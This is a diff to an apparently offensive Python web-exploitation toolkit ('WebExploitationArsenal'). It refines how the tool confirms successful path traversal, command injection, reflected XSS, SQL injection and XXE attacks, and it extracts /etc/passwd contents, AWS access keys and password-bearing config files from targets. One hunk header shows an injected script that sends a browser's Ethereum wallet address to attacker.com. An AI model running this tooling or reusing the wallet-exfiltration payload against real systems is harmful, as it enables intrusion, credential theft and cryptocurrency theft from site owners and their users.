@@ -305,8 +305,33 @@ class CodeWordAttacks:
                     url = f"{target}?{param}={payload}"
                     r = self.session.get(url, timeout=5)
                     
-                    # Check for successful file read
-                    if 'root:' in r.text or '[extensions]' in r.text or 'bin/bash' in r.text:
+                    # STRICT check for successful file read - must match /etc/passwd or win.ini format
+                    is_actual_file = False
+                    
+                    # /etc/passwd format: username:x:uid:gid:comment:home:shell
+                    if 'root:' in r.text:
+                        lines = r.text.split('\n')
+                        for line in lines:
+                            if line.startswith('root:') and line.count(':') >= 6:
+                                # Verify it's passwd format: root:x:0:0:...
+                                parts = line.split(':')
+                                if len(parts) >= 7 and parts[2].isdigit() and parts[3].isdigit():
+                                    is_actual_file = True
+                                    break
+                    
+                    # Windows win.ini format: [section] with key=value pairs
+                    elif '[extensions]' in r.text or '[fonts]' in r.text:
+                        # Check for actual INI format
+                        if '\n' in r.text and '=' in r.text:
+                            is_actual_file = True
+                    
+                    # Linux binaries/paths
+                    elif '/bin/bash' in r.text or '/bin/sh' in r.text:
+                        # Verify it's in passwd-like context
+                        if 'root:' in r.text or ':0:0:' in r.text:
+                            is_actual_file = True
+                    
+                    if is_actual_file:
                         vulns.append(Vulnerability(
                             type="FAM_PATH_TRAVERSAL",
                             severity="CRITICAL",
@@ -349,8 +374,27 @@ class CodeWordAttacks:
                     url = f"{target}?{param}={quote(payload)}"
                     r = self.session.get(url, timeout=5)
                     
-                    # Check for command output
-                    if any(indicator in r.text.lower() for indicator in ['uid=', 'gid=', 'groups=', 'windows', 'linux']):
+                    # STRICT command execution verification - must match actual command output format
+                    is_command_exec = False
+                    response_lower = r.text.lower()
+                    
+                    # Check for 'id' or 'whoami' command output
+                    if 'uid=' in response_lower and 'gid=' in response_lower:
+                        # Must match exact format: uid=X(username) gid=Y(groupname)
+                        import re
+                        if re.search(r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', response_lower):
+                            is_command_exec = True
+                    
+                    # Check for Windows command output markers
+                    elif 'volume serial number' in response_lower or 'directory of' in response_lower:
+                        is_command_exec = True
+                    
+                    # Check for Unix command success markers
+                    elif response_lower.count('\n') > 3 and any(marker in response_lower for marker in ['/root', '/home/', '/usr/bin']):
+                        # Likely 'ls' or file listing output
+                        is_command_exec = True
+                    
+                    if is_command_exec:
                         vulns.append(Vulnerability(
                             type="PCM_COMMAND_INJECTION",
                             severity="CRITICAL",
@@ -608,10 +652,30 @@ class WebExploitationArsenal:
                     url = f"{target}?{param}={quote(payload)}"
                     r = self.session.get(url, timeout=5, allow_redirects=True)
                     
-                    # Check if payload reflected in response
+                    # Check if payload reflected AND executable (not just in HTML/frontend code)
                     if payload in r.text or unquote(payload) in r.text:
-                        # Verify it's actually exploitable (not encoded)
-                        if '<script>' in r.text or 'onerror=' in r.text or 'onload=' in r.text:
+                        # STRICT verification - payload must be executable, not in comments/strings
+                        is_executable = False
+                        
+                        # Check if it's in actual executable context (not in HTML comments, not in JSON/JS strings)
+                        if '<script>' in r.text and 'alert' in r.text:
+                            # Verify not in HTML comment
+                            script_pos = r.text.find('<script>')
+                            if script_pos > 0:
+                                before_script = r.text[:script_pos]
+                                if '<!--' not in before_script or '-->' in before_script:
+                                    # Verify not in escaped/safe context
+                                    test_context = r.text[max(0, r.text.find(payload)-50):r.text.find(payload)+len(payload)+50]
+                                    if '&lt;' not in test_context and '&quot;' not in test_context:
+                                        is_executable = True
+                        
+                        elif 'onerror=' in r.text or 'onload=' in r.text:
+                            # Event handler - check if in tag attribute
+                            test_context = r.text[max(0, r.text.find(payload)-50):r.text.find(payload)+len(payload)+50]
+                            if '<' in test_context and '>' in test_context and '&lt;' not in test_context:
+                                is_executable = True
+                        
+                        if is_executable:
                             vulns.append(Vulnerability(
                                 type="XSS_REFLECTED",
                                 severity="HIGH",
@@ -685,14 +749,31 @@ class WebExploitationArsenal:
                         url = f"{urljoin(target, endpoint)}?{param}={quote(payload)}"
                         r = self.session.get(url, timeout=5)
                         
-                        # Check for SQL error messages
-                        sql_errors = [
-                            'sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'mssql',
-                            'syntax error', 'mysql_fetch', 'pg_query', 'odbc_',
-                            'mysqli', 'sqlstate', 'database error', 'query failed'
+                        # STRICT SQL error detection - must be actual database errors, not generic frontend text
+                        sql_error_patterns = [
+                            ('mysql', ['you have an error in your sql', 'mysql_fetch', 'mysql_num_rows', 'mysqli::']),
+                            ('postgresql', ['pg_query', 'pg_exec', 'postgresql query failed', 'unterminated quoted string']),
+                            ('mssql', ['microsoft sql server', 'odbc sql server', 'sqlserver jdbc', 'unclosed quotation mark']),
+                            ('oracle', ['ora-', 'oracle error', 'oracle.jdbc']),
+                            ('sqlite', ['sqlite3::', 'sqlite_', 'unrecognized token'])
                         ]
                         
-                        if any(err in r.text.lower() for err in sql_errors):
+                        # Check for REAL SQL errors (not just keywords)
+                        found_real_error = False
+                        response_lower = r.text.lower()
+                        
+                        for db_type, error_sigs in sql_error_patterns:
+                            for sig in error_sigs:
+                                if sig in response_lower:
+                                    # Double check: must have SQL-specific error context
+                                    error_context = response_lower[max(0, response_lower.find(sig)-100):response_lower.find(sig)+200]
+                                    if any(sql_word in error_context for sql_word in ['select', 'where', 'from', 'syntax', 'query', 'line']):
+                                        found_real_error = True
+                                        break
+                            if found_real_error:
+                                break
+                        
+                        if found_real_error:
                             vulns.append(Vulnerability(
                                 type="SQLI_ERROR_BASED",
                                 severity="CRITICAL",
@@ -919,8 +1000,31 @@ class WebExploitationArsenal:
                         timeout=5
                     )
                     
-                    # Check for file content in response
-                    if 'root:' in r.text or '[extensions]' in r.text or 'ami-' in r.text:
+                    # STRICT check for XXE file disclosure - must be actual file content
+                    is_xxe_success = False
+                    
+                    # Check for /etc/passwd format
+                    if 'root:' in r.text:
+                        lines = r.text.split('\n')
+                        for line in lines:
+                            if line.startswith('root:') and line.count(':') >= 6:
+                                parts = line.split(':')
+                                if len(parts) >= 7 and parts[2].isdigit():
+                                    is_xxe_success = True
+                                    break
+                    
+                    # Check for Windows INI format
+                    elif '[extensions]' in r.text or '[fonts]' in r.text:
+                        if '\n' in r.text and '=' in r.text:
+                            is_xxe_success = True
+                    
+                    # Check for AWS metadata format (actual JSON from metadata service)
+                    elif 'ami-' in r.text:
+                        # Must be JSON-like or key-value format from metadata
+                        if ('instanceid' in r.text.lower() or 'instance-id' in r.text.lower()) or ('{' in r.text and '}' in r.text):
+                            is_xxe_success = True
+                    
+                    if is_xxe_success:
                         vulns.append(Vulnerability(
                             type="XXE_FILE_DISCLOSURE",
                             severity="CRITICAL",
@@ -2185,8 +2289,25 @@ if(window.ethereum){{fetch('https://attacker.com/wallet?addr='+window.ethereum.s
                 url = f"{target}?{param}={quote(payload)}"
                 r = self.session.get(url, timeout=5)
                 
-                if 'root:' in r.text or 'AWS' in r.text or 'password' in r.text.lower():
+                # STRICT config file content verification
+                if 'root:' in r.text:
+                    # Check for actual /etc/passwd format
+                    lines = r.text.split('\n')
+                    for line in lines:
+                        if 'root:' in line and line.count(':') >= 6:
+                            parts = line.split(':')
+                            if len(parts) >= 7 and parts[2].isdigit():
+                                extracted_files[file_path] = r.text[:500]
+                                break
+                elif 'AWS' in r.text and ('AKIA' in r.text or 'aws_access' in r.text.lower()):
+                    # Actual AWS credentials format
                     extracted_files[file_path] = r.text[:500]
+                elif 'password' in r.text.lower():
+                    # Check if it's actual config (key=value or JSON format), not just HTML with "password" text
+                    if ('=' in r.text and '\n' in r.text) or ('{' in r.text and '"' in r.text):
+                        # Verify not HTML
+                        if r.text.strip().startswith('<') == False or r.text.count('=') > 3:
+                            extracted_files[file_path] = r.text[:500]
                     
                 time.sleep(self.config.delay)
             except:
